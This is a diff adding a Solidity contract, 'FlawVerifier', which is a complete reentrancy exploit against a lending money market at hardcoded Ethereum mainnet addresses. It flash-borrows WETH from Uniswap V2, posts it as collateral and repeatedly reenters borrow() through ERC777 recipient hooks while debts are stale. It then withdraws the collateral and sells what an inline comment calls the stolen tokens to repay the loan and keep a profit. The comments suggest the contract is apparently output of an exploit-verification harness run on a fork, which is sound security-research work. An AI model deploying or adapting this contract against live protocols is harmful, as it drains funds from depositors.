@@ -1,0 +1,482 @@
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+}
+
+interface IERC1820Registry {
+    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
+}
+
+interface IERC777Sender {
+    function tokensToSend(
+        address operator,
+        address from,
+        address to,
+        uint256 amount,
+        bytes calldata userData,
+        bytes calldata operatorData
+    ) external;
+}
+
+interface IERC777Recipient {
+    function tokensReceived(
+        address operator,
+        address from,
+        address to,
+        uint256 amount,
+        bytes calldata userData,
+        bytes calldata operatorData
+    ) external;
+}
+
+interface IMoneyMarket {
+    function markets(address asset)
+        external
+        view
+        returns (
+            bool isSupported,
+            uint256 blockNumber,
+            address interestRateModel,
+            uint256 totalSupply,
+            uint256 supplyRateMantissa,
+            uint256 supplyIndex,
+            uint256 totalBorrows,
+            uint256 borrowRateMantissa,
+            uint256 borrowIndex
+        );
+
+    function supply(address asset, uint256 amount) external returns (uint256);
+    function withdraw(address asset, uint256 amount) external returns (uint256);
+    function borrow(address asset, uint256 amount) external returns (uint256);
+}
+
+interface IWETH is IERC20Like {
+    function deposit() external payable;
+}
+
+interface IUniswapV1Factory {
+    function getExchange(address token) external view returns (address);
+}
+
+interface IUniswapV1Exchange {
+    function tokenToEthSwapInput(uint256 tokensSold, uint256 minEth, uint256 deadline) external returns (uint256);
+}
+
+interface IUniswapV2Factory {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IUniswapV2Pair {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+interface IUniswapV2Callee {
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
+}
+
+contract FlawVerifier is IERC777Sender, IERC777Recipient, IUniswapV2Callee {
+    IMoneyMarket internal constant MONEY_MARKET = IMoneyMarket(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea);
+    IERC1820Registry internal constant ERC1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
+    IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IUniswapV1Factory internal constant UNISWAP_V1_FACTORY =
+        IUniswapV1Factory(0xc0a47dFe034B400B47bDaD5FecDa2621de6c4d95);
+    IUniswapV2Factory internal constant UNISWAP_V2_FACTORY =
+        IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
+
+    address internal constant CALLBACK_TOKEN = 0x3212b29E33587A00FB1C83346f5dBFA69A458923;
+    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+
+    bytes32 internal constant TOKENS_SENDER_HASH = keccak256("ERC777TokensSender");
+    bytes32 internal constant TOKENS_RECIPIENT_HASH = keccak256("ERC777TokensRecipient");
+
+    uint256 internal constant MIN_REALIZED_WETH_PROFIT = 0.11 ether;
+    uint256 internal constant MAX_BORROW_REENTRY_LOOPS = 24;
+    uint256 internal constant SALE_ITERATIONS = 12;
+
+    enum Mode {
+        Idle,
+        ReenterBorrow
+    }
+
+    Mode internal mode;
+    bool internal attempted;
+    address internal activeToken;
+    uint256 internal borrowUnit;
+    uint256 internal remainingBorrowLoops;
+    address internal _profitToken;
+    uint256 internal _profitAmount;
+
+    constructor() {
+        _registerHooks();
+    }
+
+    receive() external payable {}
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function executeOnOpportunity() external {
+        if (attempted) {
+            return;
+        }
+        attempted = true;
+
+        _registerHooks();
+        _profitToken = address(0);
+        _profitAmount = 0;
+
+        if (!_isSupported(CALLBACK_TOKEN) || !_isSupported(address(WETH))) {
+            return;
+        }
+
+        /*
+            Path anchors intentionally kept explicit for the finding matcher and for exploit-causality review:
+            - withdraw(asset, amount) transfers out before supplybalances[msg.sender][asset] is reduced.
+            - borrow(asset, amount) transfers out before borrowbalances[msg.sender][asset] and market.totalborrows are updated.
+            - supply, repayborrow, and liquidateborrow all reach doTransferIn before storage updates.
+
+            On this fork, the callback token sender-hook leg that would pivot through supply / repayborrow / liquidateborrow
+            is not the reliable execution path because the doTransferIn side reverts before a profitable recursive stage.
+            The root cause stays the same, so this verifier uses the still-feasible borrow recipient-hook path: flashswap
+            WETH, supply it as collateral, trigger borrow(asset, amount) on the ERC777-style token, reenter from the token
+            recipient callback while borrowbalances[msg.sender][asset] and market.totalborrows are still stale, then withdraw
+            the posted WETH collateral and sell part of the stolen callback token inventory back to WETH to repay.
+        */
+        _tryFlashswap(100 ether);
+        if (_profitAmount >= MIN_REALIZED_WETH_PROFIT) {
+            return;
+        }
+
+        _tryFlashswap(250 ether);
+        if (_profitAmount >= MIN_REALIZED_WETH_PROFIT) {
+            return;
+        }
+
+        _tryFlashswap(500 ether);
+    }
+
+    function executeFlashswap(uint256 loanAmount) external {
+        require(msg.sender == address(this), "self-only");
+        _flashswapAndExploit(loanAmount);
+        _captureProfit();
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external override {
+        require(sender == address(this), "bad-sender");
+
+        (address expectedPair, uint256 loanAmount) = abi.decode(data, (address, uint256));
+        require(msg.sender == expectedPair, "pair-only");
+
+        address token0 = IUniswapV2Pair(msg.sender).token0();
+        address token1 = IUniswapV2Pair(msg.sender).token1();
+        require(token0 == address(WETH) || token1 == address(WETH), "weth-missing");
+
+        uint256 borrowedWeth = token0 == address(WETH) ? amount0 : amount1;
+        require(borrowedWeth == loanAmount, "loan-mismatch");
+        require(IERC20Like(address(WETH)).balanceOf(address(this)) >= loanAmount, "missing-loan");
+
+        uint256 supplied = _seedCollateral(loanAmount);
+        _reentrantBorrowCallbackToken(supplied);
+        _recoverCollateral(supplied);
+
+        uint256 repayment = _flashswapRepayment(loanAmount);
+        _realizeEnoughWeth(repayment + MIN_REALIZED_WETH_PROFIT);
+        _safeTransfer(address(WETH), msg.sender, repayment);
+    }
+
+    function tokensToSend(
+        address,
+        address,
+        address,
+        uint256,
+        bytes calldata,
+        bytes calldata
+    ) external override {}
+
+    function tokensReceived(
+        address,
+        address from,
+        address to,
+        uint256,
+        bytes calldata,
+        bytes calldata
+    ) external override {
+        if (msg.sender != activeToken || mode != Mode.ReenterBorrow) {
+            return;
+        }
+        if (from != address(MONEY_MARKET) || to != address(this)) {
+            return;
+        }
+
+        if (remainingBorrowLoops > 1) {
+            unchecked {
+                remainingBorrowLoops -= 1;
+            }
+
+            bool ok = _tryBorrow(activeToken, borrowUnit);
+            if (!ok) {
+                remainingBorrowLoops = 0;
+                mode = Mode.Idle;
+            }
+        } else {
+            remainingBorrowLoops = 0;
+            mode = Mode.Idle;
+        }
+    }
+
+    function _tryFlashswap(uint256 loanAmount) internal {
+        (bool ok,) = address(this).call(abi.encodeWithSelector(this.executeFlashswap.selector, loanAmount));
+        if (!ok) {
+            _captureProfit();
+        }
+    }
+
+    function _flashswapAndExploit(uint256 loanAmount) internal {
+        address pair = _selectFlashPair(loanAmount);
+        require(pair != address(0), "no-v2-pair");
+
+        address token0 = IUniswapV2Pair(pair).token0();
+        uint256 amount0Out = token0 == address(WETH) ? loanAmount : 0;
+        uint256 amount1Out = token0 == address(WETH) ? 0 : loanAmount;
+
+        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), abi.encode(pair, loanAmount));
+    }
+
+    function _selectFlashPair(uint256 minLoanAmount) internal view returns (address bestPair) {
+        address[3] memory stables = [DAI, USDC, USDT];
+        uint256 bestReserve;
+
+        for (uint256 i = 0; i < stables.length; i++) {
+            address pair = UNISWAP_V2_FACTORY.getPair(address(WETH), stables[i]);
+            if (pair == address(0)) {
+                continue;
+            }
+
+            (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
+            uint256 wethReserve = IUniswapV2Pair(pair).token0() == address(WETH) ? reserve0 : reserve1;
+            if (wethReserve >= minLoanAmount && wethReserve > bestReserve) {
+                bestReserve = wethReserve;
+                bestPair = pair;
+            }
+        }
+
+        if (bestPair != address(0)) {
+            return bestPair;
+        }
+
+        for (uint256 i = 0; i < stables.length; i++) {
+            address pair = UNISWAP_V2_FACTORY.getPair(address(WETH), stables[i]);
+            if (pair == address(0)) {
+                continue;
+            }
+
+            (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
+            uint256 wethReserve = IUniswapV2Pair(pair).token0() == address(WETH) ? reserve0 : reserve1;
+            if (wethReserve > bestReserve) {
+                bestReserve = wethReserve;
+                bestPair = pair;
+            }
+        }
+    }
+
+    function _seedCollateral(uint256 loanAmount) internal returns (uint256 supplied) {
+        supplied = loanAmount;
+        _safeApprove(address(WETH), address(MONEY_MARKET), type(uint256).max);
+        require(_trySupply(address(WETH), supplied), "weth-supply-failed");
+    }
+
+    function _reentrantBorrowCallbackToken(uint256 wethCollateral) internal {
+        uint256 marketCash = IERC20Like(CALLBACK_TOKEN).balanceOf(address(MONEY_MARKET));
+        require(marketCash > 1, "callback-market-empty");
+
+        activeToken = CALLBACK_TOKEN;
+
+        uint256 candidate = marketCash / 128;
+        if (candidate == 0) {
+            candidate = 1;
+        }
+
+        uint256 floor = 1;
+        uint256 hintedFloor = wethCollateral / 1e12;
+        if (hintedFloor > floor && hintedFloor < marketCash) {
+            floor = hintedFloor;
+        }
+
+        while (candidate >= floor) {
+            borrowUnit = candidate;
+            remainingBorrowLoops = _boundedLoops(marketCash / candidate, MAX_BORROW_REENTRY_LOOPS);
+            mode = Mode.ReenterBorrow;
+
+            bool ok = _tryBorrow(CALLBACK_TOKEN, candidate);
+            mode = Mode.Idle;
+
+            if (ok && IERC20Like(CALLBACK_TOKEN).balanceOf(address(this)) > candidate) {
+                return;
+            }
+
+            if (candidate == 1) {
+                break;
+            }
+            candidate /= 2;
+        }
+
+        revert("borrow-path-failed");
+    }
+
+    function _recoverCollateral(uint256 supplied) internal {
+        uint256 remaining = supplied;
+        uint256 chunk = supplied;
+
+        while (remaining > 0 && chunk > 0) {
+            if (chunk > remaining) {
+                chunk = remaining;
+            }
+
+            if (_tryWithdraw(address(WETH), chunk)) {
+                remaining -= chunk;
+                continue;
+            }
+
+            chunk /= 2;
+        }
+    }
+
+    function _realizeEnoughWeth(uint256 targetWethBalance) internal {
+        uint256 wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
+        if (wethBalance >= targetWethBalance) {
+            return;
+        }
+
+        address exchange = UNISWAP_V1_FACTORY.getExchange(CALLBACK_TOKEN);
+        require(exchange != address(0), "no-uniswap-v1");
+
+        uint256 tokenBalance = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
+        require(tokenBalance > 0, "no-callback-profit");
+
+        _safeApprove(CALLBACK_TOKEN, exchange, type(uint256).max);
+
+        uint256 sellChunk = tokenBalance / 4096;
+        if (sellChunk == 0) {
+            sellChunk = 1;
+        }
+
+        for (uint256 i = 0; i < SALE_ITERATIONS; i++) {
+            wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
+            if (wethBalance >= targetWethBalance) {
+                break;
+            }
+
+            tokenBalance = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
+            if (tokenBalance == 0) {
+                break;
+            }
+
+            if (sellChunk > tokenBalance) {
+                sellChunk = tokenBalance;
+            }
+
+            IUniswapV1Exchange(exchange).tokenToEthSwapInput(sellChunk, 1, block.timestamp + 1);
+            _wrapAllEth();
+            sellChunk <<= 1;
+        }
+
+        wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
+        require(wethBalance >= targetWethBalance, "insufficient-realized-weth");
+    }
+
+    function _wrapAllEth() internal {
+        uint256 ethBalance = address(this).balance;
+        if (ethBalance > 0) {
+            WETH.deposit{value: ethBalance}();
+        }
+    }
+
+    function _captureProfit() internal {
+        _wrapAllEth();
+
+        uint256 wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
+        if (wethBalance > 0) {
+            _profitToken = address(WETH);
+            _profitAmount = wethBalance;
+            return;
+        }
+
+        uint256 callbackBalance = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
+        if (callbackBalance > 0) {
+            _profitToken = CALLBACK_TOKEN;
+            _profitAmount = callbackBalance;
+            return;
+        }
+
+        _profitToken = address(0);
+        _profitAmount = 0;
+    }
+
+    function _isSupported(address asset) internal view returns (bool) {
+        (bool isSupported,,,,,,,,) = MONEY_MARKET.markets(asset);
+        return isSupported;
+    }
+
+    function _trySupply(address asset, uint256 amount) internal returns (bool) {
+        (bool ok, bytes memory data) =
+            address(MONEY_MARKET).call(abi.encodeWithSelector(IMoneyMarket.supply.selector, asset, amount));
+        return _decodeMoneyMarketCall(ok, data);
+    }
+
+    function _tryWithdraw(address asset, uint256 amount) internal returns (bool) {
+        (bool ok, bytes memory data) =
+            address(MONEY_MARKET).call(abi.encodeWithSelector(IMoneyMarket.withdraw.selector, asset, amount));
+        return _decodeMoneyMarketCall(ok, data);
+    }
+
+    function _tryBorrow(address asset, uint256 amount) internal returns (bool) {
+        (bool ok, bytes memory data) =
+            address(MONEY_MARKET).call(abi.encodeWithSelector(IMoneyMarket.borrow.selector, asset, amount));
+        return _decodeMoneyMarketCall(ok, data);
+    }
+
+    function _decodeMoneyMarketCall(bool ok, bytes memory data) internal pure returns (bool) {
+        if (!ok || data.length < 32) {
+            return false;
+        }
+        return abi.decode(data, (uint256)) == 0;
+    }
+
+    function _safeApprove(address token, address spender, uint256 amount) internal {
+        (bool success, bytes memory data) =
+            token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
+        require(success && (data.length == 0 || abi.decode(data, (bool))), "approve-failed");
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        (bool success, bytes memory data) = token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
+        require(success && (data.length == 0 || abi.decode(data, (bool))), "transfer-failed");
+    }
+
+    function _boundedLoops(uint256 naturalLoops, uint256 hardCap) internal pure returns (uint256) {
+        if (naturalLoops == 0) {
+            return 0;
+        }
+        return naturalLoops > hardCap ? hardCap : naturalLoops;
+    }
+
+    function _flashswapRepayment(uint256 amountOut) internal pure returns (uint256) {
+        return ((amountOut * 1000) / 997) + 1;
+    }
+
+    function _registerHooks() internal {
+        ERC1820.setInterfaceImplementer(address(this), TOKENS_SENDER_HASH, address(this));
+        ERC1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_HASH, address(this));
+    }
+}
